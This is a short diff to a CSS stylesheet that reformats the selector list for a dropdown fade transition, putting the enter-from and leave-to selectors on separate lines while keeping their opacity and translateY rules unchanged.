-.dropdown-fade-enter-from, .dropdown-fade-leave-to {
+.dropdown-fade-enter-from,
+.dropdown-fade-leave-to {
   opacity: 0;
   transform: translateY(-10px);
 }
